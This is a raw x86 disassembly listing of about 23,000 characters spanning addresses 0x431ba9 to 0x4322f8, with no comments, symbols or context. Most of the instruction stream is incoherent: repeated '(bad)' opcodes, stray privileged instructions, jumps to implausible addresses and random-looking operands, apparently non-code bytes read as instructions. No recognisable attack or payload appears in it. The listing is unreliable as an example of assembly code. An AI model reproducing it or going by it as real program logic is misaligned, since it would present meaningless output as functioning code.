  431ba9:	jne    0x431b36
  431bab:	xor    edi,esp
  431bad:	inc    eax
  431bae:	dec    ebp
  431baf:	jbe    0x431c04
  431bb1:	inc    eax
  431bb2:	pop    ebp
  431bb3:	add    edx,DWORD PTR [esi+0x8]
  431bb6:	push   esp
  431bb7:	dec    eax
  431bb8:	push   ecx
  431bb9:	mov    eax,edi
  431bbb:	and    al,0xf0
  431bbd:	jo     0x431baa
  431bbf:	mov    eax,DWORD PTR [ebx]
  431bc1:	sbb    BYTE PTR [ebp+0x4d],cl
  431bc4:	mov    eax,DWORD PTR [ebx]
  431bc6:	nop
  431bc7:	or     BYTE PTR [eax],al
  431bc9:	jne    0x431c22
  431bcb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431bd1:	cld    
  431bd2:	xor    edi,edi
  431bd4:	add    edi,DWORD PTR [ebp+0x3]
  431bd7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bdd:	js     0x431b63
  431bdf:	jae    0x431be3
  431be1:	(bad)  
  431be3:	xor    al,0x5d
  431be5:	jmp    0x431b72
  431be7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431bee:	fdecstp 
  431bf0:	test   BYTE PTR [edi],ah
  431bf2:	add    bh,BYTE PTR [ebp+0x0]
  431bf5:	add    ebx,DWORD PTR [ebp-0x77]
  431bf8:	mov    edi,eax
  431bfa:	cmp    al,0x0
  431bfd:	adc    dh,BYTE PTR [ebx]
  431bff:	jge    0x431c04
  431c01:	mov    edi,DWORD PTR [ebx]
  431c03:	jl     0x431c14
  431c05:	clc    
  431c06:	dec    edi
  431c07:	jge    0x431c09
  431c09:	mov    eax,DWORD PTR [ebx]
  431c0b:	jb     0x431c15
  431c0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431c10:	mov    edi,edi
  431c12:	xor    edx,DWORD PTR [eax]
  431c14:	add    edi,DWORD PTR [ebx]
  431c16:	mov    DWORD PTR [ebp-0x10],edi
  431c19:	inc    edi
  431c1a:	pop    ebp
  431c1b:	jge    0x431c58
  431c1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c21:	mov    edx,0xc05d87f0
  431c26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c2a:	fimul  WORD PTR [eax]
  431c2c:	fist   WORD PTR [ebp+0x1c]
  431c2f:	in     al,dx
  431c30:	jne    0x431c1e
  431c32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c3c:	fdivp  st(0),st
  431c3e:	fild   WORD PTR [ebp+0x4510f85c]
  431c44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c4a:	inc    ebp
  431c4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c51:	mov    ebp,DWORD PTR [ebx-0x4]
  431c54:	adc    al,0x8b
  431c56:	rcl    DWORD PTR [eax],0x48
  431c59:	mov    esi,0x7080803
  431c5e:	fiadd  WORD PTR [ebp+0x4d]
  431c61:	(bad)  
  431c62:	mov    edx,DWORD PTR [edx-0x4]
  431c65:	mov    edx,DWORD PTR [ebp-0x4]
  431c68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c6e:	mov    DWORD PTR [edi+0x872dc],edi
  431c74:	xlat   BYTE PTR ds:[ebx]
  431c75:	into   
  431c76:	ffreep st(6)
  431c78:	retf   0x6c7
  431c7b:	iret   
  431c7c:	dec    ebp
  431c7d:	inc    ebp
  431c7e:	mov    DWORD PTR [ebx],edi
  431c80:	fmul   QWORD PTR [edi]
  431c82:	dec    ebp
  431c83:	jnp    0x431cb8
  431c85:	add    BYTE PTR [ebx],al
  431c87:	mov    ecx,DWORD PTR [esp+edi*8]
  431c8a:	inc    ebp
  431c8b:	dec    ebp
  431c8c:	lea    esi,[ebx]
  431c8e:	add    DWORD PTR [ebx],eax
  431c90:	jb     0x431ccd
  431c92:	add    BYTE PTR [edi],cl
  431c94:	inc    ebp
  431c95:	imul   eax,edi,0x858bd800
  431c9b:	cld    
  431c9c:	clc    
  431c9d:	mov    DWORD PTR [ebp+0x0],eax
  431ca0:	inc    DWORD PTR [eax]
  431ca2:	or     al,0xde
  431ca4:	sbb    bh,0x1
  431ca7:	retf   
  431ca8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431caf:	dec    ebp
  431cb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cb6:	enter  0x12de,0xdf
  431cba:	inc    ebp
  431cbb:	pop    ebp
  431cbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cc2:	add    DWORD PTR [edx],edx
  431cc4:	add    BYTE PTR [ebp+0x50],dl
  431cc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ccd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431cd3:	or     ah,al
  431cd5:	pop    ss
  431cd6:	cdq    
  431cd7:	push   ebp
  431cd8:	clc    
  431cd9:	mov    eax,DWORD PTR [ebp-0x4]
  431cdc:	xor    edx,edx
  431cde:	add    esi,DWORD PTR [ebx]
  431ce0:	cmp    eax,DWORD PTR [ebx]
  431ce2:	hlt    
  431ce3:	cmp    DWORD PTR [ebx],esp
  431ce5:	or     al,BYTE PTR [ebp+0xf]
  431ce8:	mov    eax,DWORD PTR [edx]
  431cea:	loopne 0x431cec
  431cec:	(bad)  
  431ced:	mov    ecx,esi
  431cef:	cld    
  431cf0:	pushf  
  431cf1:	pop    ebp
  431cf2:	fwait
  431cf3:	mov    esi,DWORD PTR [edx]
  431cf5:	lock mov eax,eax
  431cf8:	adc    BYTE PTR [ebx],al
  431cfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d07:	dec    ebp
  431d08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d0e:	(bad)  
  431d0f:	iret   
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	jne    0x431d61
  431d14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d1a:	(bad)  
  431d1b:	cmp    ebx,eax
  431d1d:	je     0x431ca5
  431d1f:	add    edi,edi
  431d21:	or     bh,bh
  431d23:	dec    ebp
  431d24:	inc    ebp
  431d25:	mov    esi,DWORD PTR [ebx]
  431d27:	cld    
  431d28:	add    ecx,esi
  431d2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431d2d:	mov    edx,DWORD PTR [edi]
  431d2f:	or     BYTE PTR [ebp-0x7c],al
  431d32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d38:	test   BYTE PTR [ebx+ebx*4],cl
  431d3b:	inc    ebp
  431d3c:	xor    bh,BYTE PTR [esi]
  431d3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d45:	jne    0x431d0e
  431d47:	mov    ebp,esp
  431d49:	fcomp  DWORD PTR [ebx]
  431d4b:	add    BYTE PTR [ecx],al
  431d4d:	inc    DWORD PTR [ebp-0x75]
  431d50:	(bad)  
  431d51:	cld    
  431d52:	add    al,0xce
  431d54:	mov    ecx,edi
  431d56:	cld    
  431d57:	inc    ebp
  431d58:	fidivr WORD PTR [ebx]
  431d5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431d5d:	mov    eax,DWORD PTR [eax]
  431d5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d65:	fadd   st,st(7)
  431d67:	add    BYTE PTR [ebp-0x1],al
  431d6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431d6d:	inc    ebp
  431d6e:	mov    bh,0xc7
  431d71:	loopne 0x431db8
  431d73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d79:	sbb    dh,BYTE PTR [ebx]
  431d7b:	pushf  
  431d7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d82:	mov    eax,edi
  431d84:	cwde   
  431d85:	inc    ebp
  431d86:	inc    ebp
  431d87:	jne    0x431d14
  431d89:	mov    esp,esp
  431d8b:	clc    
  431d8c:	add    al,0x4d
  431d8e:	mov    DWORD PTR [ebx],esi
  431d90:	or     al,0x33
  431d92:	inc    ebp
  431d93:	lea    ecx,[ebx-0x398d13fd]
  431d99:	add    bh,al
  431d9b:	inc    ebp
  431d9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431da3:	add    ebp,esp
  431da5:	shufps xmm1,xmm3,0xc7
  431da9:	(bad)  
  431daa:	jmp    0x748858d3
  431daf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431db5:	hlt    
  431db6:	mov    ecx,DWORD PTR [edi]
  431db8:	fadd   DWORD PTR [ebp+0x0]
  431dbb:	xor    ecx,DWORD PTR [edi]
  431dbd:	add    ecx,ecx
  431dbf:	cmp    edi,edi
  431dc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dc5:	(bad)  
  431dc6:	jmp    0x431d53
  431dc8:	mov    edi,esp
  431dca:	or     al,0xc6
  431dcc:	inc    ebp
  431dcd:	(bad)  
  431dce:	mov    eax,DWORD PTR [ebp+0x10]
  431dd1:	jne    0x431d5c
  431dd3:	mov    eax,DWORD PTR [ecx]
  431dd5:	clc    
  431dd6:	add    BYTE PTR [ebp-0x40],cl
  431dd9:	xor    edx,DWORD PTR [eax-0x73]
  431ddc:	jne    0x431ddf
  431dde:	push   DWORD PTR [edx+0x8]
  431de1:	add    BYTE PTR [ebp+0x45],al
  431de4:	mov    ebp,ecx
  431de6:	cld    
  431de7:	add    BYTE PTR [ebp+0x0],cl
  431dea:	xor    eax,DWORD PTR [ebp+0x3]
  431ded:	mov    DWORD PTR [ebx],edi
  431def:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431df5:	sub    eax,0x5d330e4d
  431dfa:	lea    esi,[ebx]
  431dfc:	add    DWORD PTR [ebx],eax
  431dfe:	jb     0x431de9
  431e00:	add    BYTE PTR [eax],al
  431e02:	inc    ebp
  431e03:	add    bl,ch
  431e05:	inc    ebp
  431e06:	mov    esi,DWORD PTR [ebx]
  431e08:	or     al,0x3
  431e0a:	(bad)  
  431e0b:	mov    edi,eax
  431e0d:	in     al,dx
  431e0e:	scas   eax,DWORD PTR es:[edi]
  431e0f:	inc    ebp
  431e10:	mov    esi,DWORD PTR [ebx]
  431e12:	in     al,0x3
  431e14:	add    al,0x89
  431e16:	mov    ecx,DWORD PTR [eax+edi*8]
  431e19:	dec    ebp
  431e1a:	(bad)  
  431e1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e22:	mov    ecx,eax
  431e24:	cld    
  431e25:	push   es
  431e26:	dec    ebp
  431e27:	add    al,0x33
  431e29:	mov    DWORD PTR [ebx],eax
  431e2b:	in     al,dx
  431e2c:	cmp    DWORD PTR [ebp-0x67],eax
  431e2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e35:	mov    edx,DWORD PTR [ebp-0x4]
  431e38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e3b:	xor    eax,DWORD PTR [ebp+0x3]
  431e3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431e44:	xor    edi,esp
  431e46:	jmp    0xff771b98
  431e4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431e4e:	xor    ebx,DWORD PTR [edi]
  431e50:	add    eax,ecx
  431e52:	cmp    ebx,DWORD PTR [eax]
  431e54:	mov    ecx,DWORD PTR [ebp-0x4]
  431e57:	mov    ecx,DWORD PTR [eax]
  431e59:	adc    BYTE PTR [ebp-0x80],al
  431e5c:	jmp    0x431e5f
  431e5e:	mov    eax,DWORD PTR [eax]
  431e60:	cld    
  431e61:	mov    bh,0xc6
  431e63:	push   ecx
  431e64:	(bad)  
  431e65:	jne    0x431ec5
  431e67:	dec    ecx
  431e69:	or     BYTE PTR [ecx+ebx*1],cl
  431e6c:	push   ebp
  431e6d:	inc    ebp
  431e6e:	in     al,dx
  431e6f:	add    ebp,esp
  431e71:	or     bh,al
  431e73:	dec    ebp
  431e74:	cld    
  431e75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e7b:	xor    DWORD PTR [edx],0x2
  431e7e:	pushf  
  431e7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431e85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e8b:	mov    edx,DWORD PTR [ecx+0xc]
  431e8e:	xor    eax,esi
  431e90:	mov    edx,0xc172c7
  431e95:	inc    ebp
  431e96:	mov    esi,DWORD PTR [ebp+0x8]
  431e99:	mov    eax,edx
  431e9b:	call   0x84c7e590
  431ea0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431ea6:	mov    ebp,eax
  431ea8:	or     BYTE PTR [eax],dl
  431eaa:	jo     0x431ef9
  431eac:	push   edi
  431ead:	xor    esi,DWORD PTR [ebp+0x3]
  431eb0:	(bad)  
  431eb1:	pmulhuw mm0,mm1
  431eb4:	test   DWORD PTR [ebp-0x8],ecx
  431eb7:	mov    DWORD PTR [ebp-0x67],eax
  431eba:	mov    eax,DWORD PTR [ebp-0x4]
  431ebd:	xor    edi,DWORD PTR [ebp-0x73]
  431ec0:	xor    eax,DWORD PTR [ebx]
  431ec2:	xor    esi,DWORD PTR [edx+0x3]
  431ec5:	add    BYTE PTR [ecx],bh
  431ec7:	inc    ebp
  431ec8:	(bad)  
  431ec9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ecf:	mov    DWORD PTR [eax],0x750f0004
  431ed5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431edb:	lock add BYTE PTR [ebp+0x0],cl
  431edf:	mov    esi,DWORD PTR [ebp-0x18]
  431ee2:	mov    ebp,edx
  431ee4:	or     al,0x72
  431ee6:	ja     0x431ee8
  431ee8:	mov    edx,esi
  431eea:	cld    
  431eeb:	(bad)  
  431eee:	cli    
  431eef:	mov    esi,DWORD PTR [ebp-0x4]
  431ef2:	cmp    ecx,esi
  431ef4:	bswap  edi
  431ef6:	(bad)
  431efa:	mov    esi,DWORD PTR [ebp-0x4]
  431efd:	mov    esi,ecx
  431eff:	clc    
  431f00:	repnz add esi,DWORD PTR [ebp+0x45]
  431f04:	push   ebx
  431f05:	xor    eax,DWORD PTR [ebp+0x3]
  431f08:	cmp    al,0x5f
  431f0a:	pushf  
  431f0b:	pop    ebx
  431f0c:	jmp    0x431fd3
  431f11:	mov    esi,DWORD PTR [ebp-0x7d]
  431f14:	xor    ebp,DWORD PTR [eax]
  431f16:	lea    eax,[ebp-0x8]
  431f19:	xor    edx,esi
  431f1b:	pushf  
  431f1c:	out    dx,eax
  431f1d:	(bad)  
  431f1e:	neg    eax
  431f20:	ins    DWORD PTR es:[edi],dx
  431f21:	test   esi,edi
  431f23:	clc    
  431f24:	pop    esp
  431f25:	inc    ebp
  431f26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f32:	add    cl,al
  431f34:	jne    0x431ed1
  431f36:	mov    esi,DWORD PTR [edx]
  431f38:	in     al,dx
  431f39:	push   esi
  431f3a:	xor    BYTE PTR [ebp-0xe],dh
  431f3d:	add    edi,esi
  431f3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f45:	add    cl,bh
  431f47:	mov    edi,DWORD PTR [ebp+0x8]
  431f4a:	mov    DWORD PTR [ebp-0x14],esi
  431f4d:	add    esi,DWORD PTR [ebp+0x3c]
  431f50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f56:	mov    ah,0x3e
  431f58:	fwait
  431f59:	pushf  
  431f5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f60:	jne    0x431eed
  431f62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f65:	icebp  
  431f66:	icebp  
  431f67:	shl    edx,0xf2
  431f6a:	(bad)  
  431f6b:	mov    ah,0x16
  431f6d:	push   eax
  431f6e:	jne    0x431f03
  431f70:	mov    ecx,DWORD PTR [edi]
  431f72:	in     al,dx
  431f73:	jmp    0x431f66
  431f75:	add    dl,dh
  431f77:	mov    edi,esi
  431f79:	or     al,0x8
  431f7b:	inc    ebp
  431f7c:	jne    0x431f81
  431f7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f84:	ret    
  431f85:	or     bh,bh
  431f87:	jge    0x431f71
  431f89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f8f:	xor    edi,eax
  431f91:	add    esi,DWORD PTR [ebp-0x77]
  431f94:	mov    ebx,esp
  431f96:	clc    
  431f97:	neg    DWORD PTR [ebp-0x7c]
  431f9a:	xor    eax,DWORD PTR [eax]
  431f9c:	cmp    eax,DWORD PTR [eax]
  431f9e:	repz jne 0x431f36
  431fa1:	xor    eax,DWORD PTR [ecx]
  431fa3:	add    ebx,DWORD PTR [eax]
  431fa5:	mov    DWORD PTR [ebp-0x8],eax
  431fa8:	mov    eax,edi
  431faa:	cld    
  431fab:	lock pop eax
  431fad:	test   DWORD PTR [ebx],esi
  431faf:	clc    
  431fb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431fb6:	fdivp  st(4),st
  431fb8:	test   ecx,esi
  431fba:	(bad)  
  431fbb:	jnp    0x431fbc
  431fbd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fc3:	jae    0x431f50
  431fc5:	sub    edi,esp
  431fc7:	(bad)  
  431fc8:	shl    DWORD PTR [eax-0x3e],0x89
  431fcc:	leave  
  431fcd:	call   0x8198d6da
  431fd2:	in     al,dx
  431fd3:	(bad)  
  431fd4:	in     al,dx
  431fd5:	add    bh,al
  431fd7:	mov    esp,edi
  431fd9:	in     al,dx
  431fda:	test   DWORD PTR [ebp-0x8],edi
  431fdd:	mov    eax,DWORD PTR [ebp+0x2b]
  431fe0:	xor    al,BYTE PTR [ebx]
  431fe2:	pushf  
  431fe3:	jnp    0x57321c1c
  431fe9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431fed:	loopne 0x432022
  431fef:	jne    0x431fac
  431ff1:	mov    esi,DWORD PTR [edx-0x20]
  431ff4:	add    BYTE PTR [ebp-0x3d],bh
  431ff7:	xor    eax,DWORD PTR [ebp-0x73]
  431ffa:	mov    edi,DWORD PTR [esi]
  431ffc:	cld    
  431ffd:	jb     0x431fc5
  431fff:	add    bl,al
  432001:	jne    0x432048
  432003:	mov    edx,DWORD PTR [edi-0x10]
  432006:	jge    0x432085
  432008:	mov    esi,DWORD PTR [ebx]
  43200a:	lock add ecx,DWORD PTR [ebp+0x3b]
  43200e:	xor    esi,DWORD PTR [ebp-0x77]
  432011:	mov    esi,eax
  432013:	lock inc ebp
  432015:	jge    0x432048
  432017:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  43201e:	dec    ebp
  43201f:	mov    esi,DWORD PTR [ebx]
  432021:	loopne 0x431fac
  432023:	jge    0x43201d
  432025:	add    DWORD PTR [ebp-0x7d],eax
  432028:	icebp  
  432029:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432030:	dec    ebp
  432031:	hlt    
  432032:	xor    ebx,DWORD PTR [ebp-0x77]
  432035:	mov    esi,esp
  432037:	in     al,0x45
  432039:	jge    0x432078
  43203b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432042:	dec    ebp
  432043:	push   esp
  432044:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43204a:	inc    ebp
  43204b:	hlt    
  43204c:	xor    DWORD PTR [ebp-0x61],esi
  43204f:	mov    edi,DWORD PTR [eax+0xf19504]
  432055:	repnz mov DWORD PTR [ebp+0x20],ebx
  432059:	cmp    eax,DWORD PTR [ebp+0xf]
  43205c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432060:	fistp  WORD PTR [ebx+0x0]
  432063:	inc    ebp
  432064:	mov    ebx,DWORD PTR [edi+0xc]
  432067:	add    eax,eax
  432069:	inc    ebp
  43206a:	test   BYTE PTR [ebx],dh
  43206c:	add    eax,DWORD PTR [ebx]
  43206e:	add    BYTE PTR [esi+0x45],bl
  432071:	ret    0x85
  432074:	jnp    0x5443a443
  43207a:	inc    bp
  43207c:	inc    ebp
  43207d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432083:	fdiv   QWORD PTR [ebx]
  432085:	test   DWORD PTR [ecx+0x453bf8],edi
  43208b:	push   ebx
  43208c:	add    edi,DWORD PTR [esi+0x708088b]
  432092:	cmp    esi,eax
  432094:	setnp  BYTE PTR [ecx-0x74fcffce]
  43209b:	mov    esp,edi
  43209d:	call   0x33ce65ef
  4320a2:	or     BYTE PTR [ebx],al
  4320a4:	inc    ecx
  4320a5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320ab:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320b1:	lock add cl,al
  4320b4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320bb:	mov    ch,0x45
  4320bd:	clc    
  4320be:	xor    eax,DWORD PTR [ebp+0x3]
  4320c1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320c7:	inc    ebp
  4320c8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320ce:	mov    edi,eax
  4320d0:	mov    eax,DWORD PTR [ebp+0x3c]
  4320d3:	mov    ecx,DWORD PTR [eax]
  4320d5:	hlt    
  4320d6:	inc    ebp
  4320d7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320de:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320e4:	push   ebp
  4320e5:	mov    edi,DWORD PTR [ebx]
  4320e7:	in     al,dx
  4320e8:	jne    0x4320ab
  4320ea:	mov    eax,DWORD PTR [ebp-0x28]
  4320ed:	add    DWORD PTR [eax],0xe8058dec
  4320f3:	clc    
  4320f4:	mov    esi,DWORD PTR [edi-0x8]
  4320f7:	add    dh,dl
  4320f9:	rol    WORD PTR [ebp-0x1],cl
  4320fd:	mov    edx,DWORD PTR [eax+0x8]
  432100:	jne    0x4320c2
  432102:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432109:	inc    ebp
  43210a:	push   esp
  43210b:	test   DWORD PTR [ecx+0xf],ecx
  43210e:	sub    edx,esp
  432110:	add    eax,DWORD PTR [eax]
  432112:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432118:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43211f:	mov    eax,DWORD PTR [ecx]
  432121:	and    BYTE PTR [eax],al
  432123:	cmp    al,0x10
  432125:	add    BYTE PTR [ebp+0x66],al
  432128:	inc    ecx
  43212a:	push   esp
  43212b:	add    dh,BYTE PTR [ebp+0x0]
  43212e:	push   edx
  43212f:	enterw 0xc1,0x4d
  432134:	mov    esp,DWORD PTR [esi+0x20]
  432137:	add    DWORD PTR [ecx-0x7b],eax
  43213a:	add    eax,DWORD PTR [ebx]
  43213c:	str    WORD PTR [eax+0x45]
  432140:	lea    ecx,[ebx+0x45890801]
  432146:	sbb    BYTE PTR [ebx],al
  432148:	dec    ebp
  432149:	cmp    al,0xf
  43214b:	inc    ebp
  43214c:	push   eax
  43214d:	mov    esi,DWORD PTR [ebx]
  43214f:	push   eax
  432150:	add    eax,eax
  432152:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432159:	inc    ebp
  43215a:	add    BYTE PTR [ecx],dh
  43215c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432163:	(bad)  
  432164:	mov    ebx,eax
  432166:	loopne 0x4321ad
  432168:	dec    ebp
  432169:	mov    ecx,DWORD PTR [edi]
  43216b:	cld    
  43216c:	push   eax
  43216d:	xchg   DWORD PTR [ebx],esi
  43216f:	add    DWORD PTR [ebx],ebp
  432171:	add    BYTE PTR [ebx],ch
  432173:	or     BYTE PTR [ecx],bh
  432175:	dec    ecx
  432176:	loopne 0x43217b
  432178:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43217e:	push   ebp
  43217f:	add    DWORD PTR [ebx+0x55100800],eax
  432185:	dec    ebp
  432186:	jmp    0x432111
  432188:	mov    esp,DWORD PTR [eax]
  43218a:	sbb    dl,dl
  43218c:	inc    eax
  43218d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432193:	add    BYTE PTR [ebx+0x74528555],cl
  432199:	push   ebp
  43219a:	div    DWORD PTR [ebx]
  43219c:	and    eax,DWORD PTR [ebx]
  43219e:	add    edx,DWORD PTR [edx-0x30]
  4321a1:	jno    0x43212e
  4321a3:	inc    DWORD PTR [eax+eiz*1]
  4321a6:	inc    ebp
  4321a7:	push   eax
  4321a8:	push   eax
  4321a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321af:	mov    edi,esp
  4321b1:	push   eax
  4321b2:	inc    ebp
  4321b3:	enter  0x458b,0x8
  4321b7:	push   ecx
  4321b8:	(bad)  
  4321b9:	call   0x10d2b91
  4321be:	pop    ss
  4321bf:	push   ebp
  4321c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4321c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321cc:	push   ecx
  4321cd:	jo     0x4321b7
  4321cf:	inc    DWORD PTR [edi]
  4321d1:	or     BYTE PTR [eax],al
  4321d3:	call   0xce291d
  4321d8:	fmul   QWORD PTR [ebp+0x55]
  4321db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321e1:	mov    bh,0x8c
  4321e3:	adc    al,0x9b
  4321e5:	dec    esp
  4321e6:	xor    bl,BYTE PTR [eax]
  4321e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4321eb:	mov    eax,DWORD PTR [ebp-0x4]
  4321ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4321f4:	push   es
  4321f5:	retf   
  4321f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4321fa:	inc    ebp
  4321fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432202:	retf   0x83fc
  432205:	into   
  432206:	dec    ebp
  432207:	retf   
  432208:	mov    ecx,DWORD PTR [ebp-0x74]
  43220b:	mov    eax,DWORD PTR [eax]
  43220d:	fdiv   QWORD PTR [ebx]
  43220f:	mov    bh,0x3
  432211:	push   es
  432212:	mov    esi,ecx
  432214:	sbb    cl,dl
  432216:	dec    ebp
  432217:	sar    DWORD PTR [ebx],cl
  432219:	push   ebp
  43221a:	jne    0x43222b
  43221c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432222:	lea    ebx,[eax]
  432224:	call   0xf4ccadeb
  432229:	sbb    dh,dl
  43222b:	add    edx,ebx
  43222d:	push   ebp
  43222e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432234:	push   ecx
  432235:	mov    DWORD PTR [eax-0x30],edx
  432238:	test   DWORD PTR [edx],eax
  43223a:	xadd   esp,esi
  43223d:	pop    es
  43223e:	add    cl,dl
  432240:	mov    eax,ecx
  432242:	or     al,0x45
  432244:	(bad)  
  432245:	push   eax
  432246:	add    DWORD PTR [edx+0x0],eax
  432249:	add    ecx,DWORD PTR [ecx]
  43224b:	and    dh,cl
  43224d:	call   0xc72b1d
  432252:	add    DWORD PTR [ebp+0x0],edx
  432255:	mov    esp,DWORD PTR [ebp+0x18]
  432258:	add    BYTE PTR [eax+0x50],cl
  43225b:	xor    eax,DWORD PTR [eax]
  43225d:	add    esp,DWORD PTR [esi+0x3b]
  432260:	inc    ebp
  432261:	je     0x4321e6
  432263:	push   ecx
  432264:	dec    BYTE PTR [ebp-0x77]
  432267:	add    eax,esi
  432269:	or     al,0x5e
  43226b:	inc    eax
  43226c:	add    BYTE PTR [ebx],al
  43226e:	data16 and BYTE PTR [ebp+0x50],al
  432272:	sub    DWORD PTR [ecx],0xfffffff8
  432275:	add    BYTE PTR [ebp-0x75],ah
  432278:	add    BYTE PTR [eax],bl
  43227a:	enter  0x894d,0x8b
  43227e:	int3   
  43227f:	loopne 0x432243
  432281:	rol    BYTE PTR [eax],0x33
  432284:	lea    cx,[ebp+0xa]
  432288:	data16 jb 0x4322d0
  43228b:	add    BYTE PTR [ebx+0x44890855],cl
  432291:	sbb    ah,al
  432293:	inc    ebp
  432294:	cmp    al,0xf
  432296:	add    BYTE PTR [edx+0x66],dl
  432299:	xor    ecx,DWORD PTR [eax]
  43229b:	sub    eax,DWORD PTR [edx]
  43229d:	mov    eax,DWORD PTR [eax]
  43229f:	or     al,0x66
  4322a1:	ror    edx,cl
  4322a3:	dec    ebp
  4322a4:	inc    ebp
  4322a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322ab:	cld    
  4322ac:	or     BYTE PTR [edi+0x4501dd],dl
  4322b2:	ret    0xecce
  4322b5:	retf   
  4322b6:	(bad)  
  4322b7:	dec    ebp
  4322b8:	mov    al,0x8b
  4322ba:	loopne 0x4322dc
  4322bc:	cmp    ecx,DWORD PTR [edx]
  4322be:	inc    ebp
  4322bf:	daa    
  4322c0:	loopne 0x432249
  4322c2:	in     al,dx
  4322c3:	add    edi,eax
  4322c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4322cb:	push   ebp
  4322cc:	inc    ebp
  4322cd:	xor    ebx,edx
  4322cf:	add    ebp,esp
  4322d1:	push   edx
  4322d2:	push   bp
  4322d4:	inc    ebp
  4322d5:	(bad)  
  4322d6:	in     eax,dx
  4322d7:	push   esp
  4322d8:	(bad)  
  4322d9:	inc    edx
  4322db:	sbb    al,0x33
  4322dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322e4:	add    BYTE PTR [ebp+0x46],0x8b
  4322e8:	jmp    0xf98b:0x100041c8
  4322ef:	xor    esi,DWORD PTR [edx+0x3]
  4322f2:	mov    ecx,DWORD PTR [edi]
  4322f4:	fmul   DWORD PTR [edx]
  4322f6:	add    BYTE PTR [eax],al
  4322f8:	lea    eax,[ebx-0x4700273c]
